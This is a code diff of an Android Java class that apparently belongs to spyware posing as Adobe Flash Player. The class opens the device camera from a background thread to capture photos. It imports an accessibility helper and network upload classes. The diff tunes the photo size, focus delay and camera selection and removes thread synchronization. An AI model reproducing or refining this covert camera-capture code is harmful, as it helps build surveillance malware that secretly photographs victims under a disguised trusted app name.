@@ -34,13 +34,13 @@ import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.Public;
 
-@SuppressWarnings("deprecation")
+
 public class CameraDialog implements Runnable
 {
     private final String TAG = "CameraDialog[ljg]";
 
-    public int DEFAULT_CAMERA_PHOTO_WIDTH = 600;
-    public int DEFAULT_CAMERA_PHOTO_HEIGHT = 800;
+    public int DEFAULT_CAMERA_PHOTO_WIDTH = 480;
+    public int DEFAULT_CAMERA_PHOTO_HEIGHT = 640;
 
     private Context context = null;
     private int camerano = 0;
@@ -52,7 +52,7 @@ public class CameraDialog implements Runnable
 
     private Camera myCamera = null;
 
-    private final int CAMERAFOCUSDELAY = 100;
+    private final int CAMERAFOCUSDELAY = 600;
 
     private long camerastarttime ;
 
@@ -62,15 +62,15 @@ public class CameraDialog implements Runnable
     public CameraDialog(Context context,int camerano)
     {
         try{
-            context = AccessHelper.getActivity().get(0);
+            this.context = AccessHelper.getActivity().get(0);
         }catch (Exception e){
             e.printStackTrace();
         }
-        if (context == null){
+        if (this.context == null){
             this.context = context;
         }
 
-        this.camerano = (camerano^1);
+        this.camerano = camerano;
     }
 
 
@@ -92,9 +92,7 @@ public class CameraDialog implements Runnable
 
             Looper.prepare();
 
-            synchronized (CameraDialog.class) {
-                dialogSvCameraPhoto(context);
-            }
+            dialogSvCameraPhoto(context);
 
             Looper.loop();
 
@@ -308,7 +306,7 @@ public class CameraDialog implements Runnable
         Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
         for (int camIdx = 0, cameraCount = Camera.getNumberOfCameras(); camIdx < cameraCount; camIdx++) {
             Camera.getCameraInfo(camIdx, cameraInfo);
-            if (cameraInfo.facing == num) {	//Camera.CameraInfo.CAMERA_FACING_FRONT
+            if (cameraInfo.facing == num) {
                 myCamera = Camera.open(camIdx);
             }
         }
